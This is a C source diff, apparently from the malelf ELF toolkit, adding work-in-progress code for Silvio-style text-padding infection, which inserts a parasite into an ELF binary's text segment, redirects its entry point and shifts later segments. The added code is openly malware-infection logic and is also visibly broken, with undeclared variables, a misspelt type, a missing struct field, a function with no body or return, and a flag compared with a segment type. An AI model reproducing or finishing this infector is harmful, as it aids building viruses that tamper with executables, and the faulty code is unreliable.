@@ -46,6 +46,17 @@
 
 #define PAGE_SIZE 4096
 
+typedef struct {
+        MalelfBinary *host;
+        MalelfBinary *parasite;
+        _u32 host_entry_point;
+        _u32 parasite_entry_point;
+        _u32 infect_offset_at;
+        _u32 parasite_vaddr;
+        _u32 shift_segments_from;
+        _u32 shift_segments_until;
+} MalelfInfect;
+
 static _u8 _malelf_infect_silvio_padding(MalelfBinary* input,
                                   MalelfBinary* output,
                                   unsigned int end_of_text,
@@ -113,6 +124,65 @@ static _u8 _malelf_infect_silvio_padding(MalelfBinary* input,
         return MALELF_SUCCESS;
 }
 
+_u32 malelf_infect_silvio_padding32_new(MalelfBinary *input,
+                                     MalelfBinary *output,
+                                     MalelfBinary *parasite,
+                                     _u32 offset_entry_point,
+                                     _u32 magic_bytes)
+{
+        _u32 i;
+        _u32 error = MALELF_SUCCESS;
+}
+
+_u32 _malelf_infect_prepare_silvio_padding32(MalelfInfect *infector)
+{
+        Elf32_Ehdr *host_ehdr;
+        Elf32_Phdr *host_phdr, *phdr;
+        Elf32_Shdr *host_shdr, *shdr;
+        MalelfBinary *host;
+        MalelfBinary *parasite;
+        _u8 text_found = 0;
+
+        assert (NULL != infector &&
+                NULL != infector->host &&
+                NULL != infector->parasite);
+
+        host = infector->host;
+        parasite = infector->parasite;
+
+        ehdr = (ELf32_Ehdr *) MALELF_ELF_DATA(host->ehdr);
+        phdr = (Elf32_Phdr *) MALELF_ELF_DATA(host->phdr);
+        shdr = (Elf32_Shdr *) MALELF_ELF_DATA(host->shdr);
+
+        for (phdr = host_phdr, i = host_ehdr->e_phnum;
+             i > 0;
+             i--, phdr++) {
+                if (text_found) {
+                        /* TODO: shift segments ... */
+                        continue;
+                } else if (phdr->p_type == (PF_X | PF_R)) {
+                        text_found = (host_ehdr->e_phnum - i);
+                        infector->parasite_entry_point =
+                                (phdr->p_vaddr + phdr->p_filesz);
+                        infector->host_entry_point = ehdr->e_entry;
+                        infector->infect_offset_at =
+                                (phdr->p_offset + phdr->p_filesz);
+                }
+        }
+
+        if (!text_found) {
+                MALELF_DEBUG_ERROR("TEXT segment not found in binary "
+                                   "'%s'.", host->fname);
+                return MALELF_ETEXT_SEG_NOT_FOUND;
+        }
+
+        infector->shift_segments_from = text_found;
+        infector->shift_segments_until = 0;
+        infector->shift_segments_by = PAGE_SIZE;
+
+        return MALELF_SUCCESS;
+}
+
 
 _u8 malelf_infect_silvio_padding32(MalelfBinary *input,
                                    MalelfBinary *output,
@@ -141,7 +211,8 @@ _u8 malelf_infect_silvio_padding32(MalelfBinary *input,
 
         for (i = ehdr->e_phnum; i-- > 0; phdr++) {
                 if (text_found) {
-                        /* shift every segment after the text segment by PAGE_SIZE */
+                        /* shift every segment after the text
+                           segment by PAGE_SIZE */
                         phdr->p_offset += PAGE_SIZE;
                         continue;
                 } else {
